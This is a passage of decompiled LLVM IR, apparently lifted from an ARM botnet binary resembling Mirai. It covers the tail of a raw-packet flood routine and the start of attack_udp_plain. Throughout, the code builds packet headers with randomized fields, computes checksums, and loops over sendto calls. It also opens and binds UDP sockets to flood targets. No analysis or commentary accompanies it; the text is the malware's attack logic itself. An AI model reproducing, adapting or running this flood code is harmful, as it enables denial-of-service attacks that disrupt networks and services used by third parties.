  %v2_b3c0 = add i32 %v1_b3c0, 52
  %v3_b3c0 = inttoptr i32 %v2_b3c0 to i32*
  store i32 %v0_b3c0, i32* %v3_b3c0, align 4
  %v0_b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3c4 = trunc i32 %v0_b3c4 to i8
  %v2_b3c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c4 = add i32 %v2_b3c4, 56
  %v4_b3c4 = inttoptr i32 %v3_b3c4 to i8*
  store i8 %v1_b3c4, i8* %v4_b3c4, align 1
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 58
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b3cc = add i32 %v2_b3cc, 57
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v3_b3d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3d0, i32* %r3.global-to-local, align 4
  %v1_b3d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v1_b3d4, %v3_b3d0
  store i32 %v2_b3d4, i32* @r4, align 4
  %v1_b3d8 = load i32, i32* @r7, align 4
  %v9_b3d8 = icmp eq i32 %v2_b3d4, %v1_b3d8
  store i1 %v9_b3d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b3d4, i32* %stack_var_-44, align 4
  %v5_b3e0 = icmp slt i32 %v2_b3d4, %v1_b3d8
  br i1 %v5_b3e0, label %dec_label_pc_b228, label %dec_label_pc_b3e4.preheader

dec_label_pc_b3e4.preheader:                      ; preds = %bb61, %dec_label_pc_b158
  %v0_b3e86 = phi i32 [ 0, %dec_label_pc_b158 ], [ %v1_b3d8, %bb61 ]
  %v3_b560 = icmp eq i32 %v6_b10c, -1
  %v8_b560 = icmp eq i32 %v6_b10c, -1
  %v3_b430 = icmp eq i32 %v3_b174, 65535
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4, %dec_label_pc_b3e4.preheader
  %v0_b3e8 = phi i32 [ %v0_b3e86, %dec_label_pc_b3e4.preheader ], [ 0, %dec_label_pc_b4f4 ], [ 0, %dec_label_pc_b3e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b3f4
  %v1_b408 = phi i32 [ %v1_b4e4, %dec_label_pc_b470 ], [ 0, %dec_label_pc_b3f4 ]
  %v5_b3fc = mul i32 %v1_b408, 24
  %v1_b400 = load i32, i32* @r8, align 4
  %v2_b400 = add i32 %v1_b400, %v5_b3fc
  store i32 %v2_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b400, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @sb, align 4
  %v4_b408 = mul i32 %v1_b408, 4
  %v5_b408 = add i32 %v0_b408, %v4_b408
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  store i32 %v7_b408, i32* @r5, align 4
  %v7_b40c = icmp eq i8 %v3_b404, 31
  store i1 %v7_b40c, i1* %cpsr_z.global-to-local, align 1
  %v1_b410 = add i32 %v7_b408, 20
  store i32 %v1_b410, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b404, 32
  br i1 %tmp67, label %dec_label_pc_b508, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3f8
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_b430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b430, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v1_b43c = phi i32 [ %v1_b578, %dec_label_pc_b568 ], [ 65535, %dec_label_pc_b424 ]
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v9_b43c = icmp eq i32 %v3_b178, %v1_b43c
  store i1 %v9_b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b43c, label %dec_label_pc_b598, label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b584.dec_label_pc_b444_crit_edge, %dec_label_pc_b438
  %v1_b448 = phi i32 [ %v1_b448.pre, %dec_label_pc_b584.dec_label_pc_b444_crit_edge ], [ %v1_b43c, %dec_label_pc_b438 ]
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v9_b448 = icmp eq i32 %v3_b17c, %v1_b448
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b448, label %dec_label_pc_b5ac, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b598.dec_label_pc_b450_crit_edge, %dec_label_pc_b444
  %v1_b454 = phi i32 [ %v1_b454.pre, %dec_label_pc_b598.dec_label_pc_b450_crit_edge ], [ %v1_b448, %dec_label_pc_b444 ]
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v9_b454 = icmp eq i32 %v6_b048, %v1_b454
  store i1 %v9_b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b454, label %dec_label_pc_b5c0, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge, %dec_label_pc_b450
  %v1_b460 = phi i32 [ %v1_b460.pre, %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge ], [ %v1_b454, %dec_label_pc_b450 ]
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v9_b460 = icmp eq i32 %v6_b060, %v1_b460
  store i1 %v9_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b460, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b468 = load i32, i32* @fp, align 4
  %v2_b468 = icmp eq i32 %v0_b468, 0
  store i1 %v2_b468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b468, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b470:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4, %dec_label_pc_b5e4
  %v2_b474 = load i32, i32* @r5, align 4
  %v3_b474 = add i32 %v2_b474, 10
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 0, i16* %v4_b474, align 2
  %v0_b478 = load i32, i32* @r5, align 4
  store i32 %v0_b478, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b480 = call i32 @checksum_generic(i32 %v0_b478, i32 20)
  %v3_b480 = trunc i32 %v2_b480 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 10
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v3_b480, i16* %v5_b488, align 2
  %v0_b48c = load i32, i32* @r6, align 4
  store i32 %v0_b48c, i32* @r1, align 4
  %v0_b490 = load i32, i32* %r2.global-to-local, align 4
  %v1_b490 = trunc i32 %v0_b490 to i16
  %v3_b490 = add i32 %v0_b48c, 16
  %v4_b490 = inttoptr i32 %v3_b490 to i16*
  store i16 %v1_b490, i16* %v4_b490, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = call i32 @checksum_tcpudp(i32 %v0_b49c, i32 %v0_b48c, i32 10240, i32 40)
  %v5_b4a0 = trunc i32 %v4_b4a0 to i16
  store i32 %v4_b4a0, i32* %r0.global-to-local, align 4
  %v3_b4a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a4, i32* %r3.global-to-local, align 4
  %v3_b4a8 = mul i32 %v3_b4a4, 32
  store i32 %v3_b4a8, i32* %lr.global-to-local, align 4
  %v3_b4ac = load i32, i32* @r6, align 4
  %v4_b4ac = add i32 %v3_b4ac, 16
  %v5_b4ac = inttoptr i32 %v4_b4ac to i16*
  store i16 %v5_b4a0, i16* %v5_b4ac, align 2
  %v0_b4b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b4b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b4b0, -8
  %v5_b4b0 = add i32 %v0_b4b0, %tmp68
  store i32 %v5_b4b0, i32* %lr.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r6, align 4
  %v1_b4b4 = add i32 %v0_b4b4, 2
  %v2_b4b4 = inttoptr i32 %v1_b4b4 to i16*
  %v3_b4b4 = load i16, i16* %v2_b4b4, align 2
  %v4_b4b4 = zext i16 %v3_b4b4 to i32
  store i32 %v4_b4b4, i32* @r6, align 4
  %v1_b4b8 = load i32, i32* @r8, align 4
  %v2_b4b8 = add i32 %v1_b4b8, %v5_b4b0
  store i32 %v2_b4b8, i32* @lr, align 4
  %v3_b4bc = add i32 %v2_b4b8, 2
  %v4_b4bc = inttoptr i32 %v3_b4bc to i16*
  store i16 %v3_b4b4, i16* %v4_b4bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  %v0_b4cc = load i32, i32* @sl, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @lr, align 4
  %v6_b4dc = call i32 @__libc_sendto(i32 %v0_b4cc, i32 %v0_b4c8, i32 60, i32 16384, i32 %v0_b4d4, i32 16)
  %v3_b4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4e0, i32* %r3.global-to-local, align 4
  %v1_b4e4 = add i32 %v3_b4e0, 1
  store i32 %v1_b4e4, i32* %r0.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r7, align 4
  %v9_b4e8 = icmp eq i32 %v1_b4e4, %v1_b4e8
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4e4, i32* %stack_var_-44, align 4
  %v5_b4f0 = icmp slt i32 %v1_b4e4, %v1_b4e8
  br i1 %v5_b4f0, label %dec_label_pc_b3f8, label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b470
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4f8 = icmp eq i32 %v1_b4e8, 0
  store i1 %v2_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4f8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b508:                                ; preds = %dec_label_pc_b3f8
  %v1_b508 = add i32 %v2_b400, 16
  %v2_b508 = inttoptr i32 %v1_b508 to i32*
  %v3_b508 = load i32, i32* %v2_b508, align 4
  store i32 %v3_b508, i32* %r4.global-to-local, align 4
  %v0_b50c = call i32 @rand_next()
  store i32 %v0_b50c, i32* %r0.global-to-local, align 4
  %v3_b510 = load i32, i32* %stack_var_-44, align 4
  %v5_b518 = mul i32 %v3_b510, 24
  %v0_b51c = load i32, i32* %r4.global-to-local, align 4
  %v1_b51c = and i32 %v0_b51c, 16711680
  %v3_b520 = udiv i32 %v0_b51c, 16777216
  %v4_b524 = udiv i32 %v1_b51c, 256
  %v5_b524 = or i32 %v4_b524, %v3_b520
  store i32 %v5_b524, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r8, align 4
  %v2_b528 = add i32 %v1_b528, %v5_b518
  store i32 %v2_b528, i32* %r1.global-to-local, align 4
  %v1_b52c = and i32 %v0_b51c, 65280
  store i32 %v1_b52c, i32* %r3.global-to-local, align 4
  %v1_b530 = add i32 %v2_b528, 20
  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  %v5_b538 = call i32 @llvm.bswap.i32(i32 %v0_b51c)
  %v7_b53c = lshr i32 %v0_b50c, %v4_b530
  %v8_b53c = add i32 %v7_b53c, %v5_b538
  store i32 %v8_b53c, i32* %r2.global-to-local, align 4
  %v1_b540 = and i32 %v8_b53c, 16711680
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  %v1_b54c = and i32 %v8_b53c, 65280
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v5_b554 = call i32 @llvm.bswap.i32(i32 %v8_b53c)
  %v1_b558 = load i32, i32* @r5, align 4
  %v2_b558 = add i32 %v1_b558, 16
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v5_b554, i32* %v3_b558, align 4
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b568:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  %v0_b568 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = add i32 %v1_b570, 12
  %v3_b570 = inttoptr i32 %v2_b570 to i32*
  store i32 %v0_b568, i32* %v3_b570, align 4
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  %v0_b578 = load i32, i32* %r4.global-to-local, align 4
  %v1_b578 = add i32 %v0_b578, -1
  store i32 %v1_b578, i32* @r4, align 4
  %v9_b57c = icmp eq i32 %v3_b174, %v1_b578
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b584:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v0_b584 = call i32 @rand_next()
  %v1_b584 = trunc i32 %v0_b584 to i16
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v3_b178, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  %v3_b590 = load i32, i32* @r5, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i16*
  store i16 %v1_b584, i16* %v5_b590, align 2
  br i1 %v9_b58c, label %dec_label_pc_b598, label %dec_label_pc_b584.dec_label_pc_b444_crit_edge

dec_label_pc_b584.dec_label_pc_b444_crit_edge:    ; preds = %dec_label_pc_b584
  %v1_b448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b444

dec_label_pc_b598:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b438
  %v0_b598 = call i32 @rand_next()
  %v1_b598 = trunc i32 %v0_b598 to i16
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v1_b5a0 = load i32, i32* @r4, align 4
  %v9_b5a0 = icmp eq i32 %v3_b17c, %v1_b5a0
  store i1 %v9_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_b5a4 = load i32, i32* @r5, align 4
  %v4_b5a4 = add i32 %v3_b5a4, 20
  %v5_b5a4 = inttoptr i32 %v4_b5a4 to i16*
  store i16 %v1_b598, i16* %v5_b5a4, align 2
  br i1 %v9_b5a0, label %dec_label_pc_b5ac, label %dec_label_pc_b598.dec_label_pc_b450_crit_edge

dec_label_pc_b598.dec_label_pc_b450_crit_edge:    ; preds = %dec_label_pc_b598
  %v1_b454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b450

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b444
  %v0_b5ac = call i32 @rand_next()
  %v1_b5ac = trunc i32 %v0_b5ac to i16
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v1_b5b4 = load i32, i32* @r4, align 4
  %v9_b5b4 = icmp eq i32 %v6_b048, %v1_b5b4
  store i1 %v9_b5b4, i1* %cpsr_z.global-to-local, align 1
  %v3_b5b8 = load i32, i32* @r6, align 4
  %v4_b5b8 = add i32 %v3_b5b8, 2
  %v5_b5b8 = inttoptr i32 %v4_b5b8 to i16*
  store i16 %v1_b5ac, i16* %v5_b5b8, align 2
  br i1 %v9_b5b4, label %dec_label_pc_b5c0, label %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge

dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge:    ; preds = %dec_label_pc_b5ac
  %v1_b460.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b45c

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5ac, %dec_label_pc_b450
  %v0_b5c0 = call i32 @rand_next()
  %v1_b5c4 = load i32, i32* @r6, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 4
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c4, align 4
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @r4, align 4
  %v9_b5cc = icmp eq i32 %v6_b060, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5cc, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b5d4 = call i32 @rand_next()
  store i32 %v0_b5d4, i32* %r0.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @fp, align 4
  %v2_b5d8 = icmp eq i32 %v0_b5d8, 0
  store i1 %v2_b5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_b5dc = load i32, i32* @r6, align 4
  %v2_b5dc = add i32 %v1_b5dc, 8
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v0_b5d4, i32* %v3_b5dc, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4
  %v0_b5e4 = call i32 @rand_next()
  %v1_b5e4 = trunc i32 %v0_b5e4 to i16
  store i32 %v0_b5e4, i32* %r0.global-to-local, align 4
  %v3_b5e8 = load i32, i32* @r6, align 4
  %v4_b5e8 = add i32 %v3_b5e8, 18
  %v5_b5e8 = inttoptr i32 %v4_b5e8 to i16*
  store i16 %v1_b5e4, i16* %v5_b5e8, align 2
  br label %dec_label_pc_b470

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b130
  %v0_b5f0 = load i32, i32* @sl, align 4
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v1_b5f4 = call i32 @__GI___libc_close(i32 %v0_b5f0)
  store i32 %v1_b5f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %entry, %dec_label_pc_b5f0
  %v1_b600 = phi i32 [ %v3_b120, %entry ], [ %v1_b5f4, %dec_label_pc_b5f0 ]
  store i32 %v3_af5c, i32* %r4.global-to-local, align 4
  store i32 %v24_af5c, i32* %fp.global-to-local, align 4
  store i32 %v27_af5c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b600

; uselistorder directives
  uselistorder i32 %v0_b5e4, { 1, 0 }
  uselistorder i32 %v0_b5ac, { 1, 0 }
  uselistorder i32 %v0_b598, { 1, 0 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v1_b578, { 1, 2, 0 }
  uselistorder i32 %v0_b51c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b4e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b4b0, { 1, 0 }
  uselistorder i32 %v4_b4a0, { 1, 0 }
  uselistorder i1 %v3_b430, { 1, 0 }
  uselistorder i32 %v2_b3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b23c, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 2, 1, 0 }
  uselistorder i32 %v1_b204, { 2, 0, 1 }
  uselistorder i32 %v1_b200, { 2, 0, 1 }
  uselistorder i32 %v1_b1fc, { 2, 0, 1 }
  uselistorder i32 %v1_b1d8, { 1, 0 }
  uselistorder i32 %v3_b174, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b168, { 1, 0, 2 }
  uselistorder i32 %v0_b164, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b150, { 1, 0 }
  uselistorder i1 %v7_b124, { 1, 0 }
  uselistorder i32 %v3_b120, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b10c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b060, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b048, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_afd4, { 1, 0 }
  uselistorder i32 %v6_afcc, { 1, 0 }
  uselistorder i32 %v7_afb4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v5_b654 = inttoptr i32 %v0_b640 to i32*
  %v6_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v5_b654, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v6_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %v5_b674 = inttoptr i32 %v0_b660 to i32*
  %v6_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v5_b674, i32 6, i32 %v0_b668, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v6_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v6_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
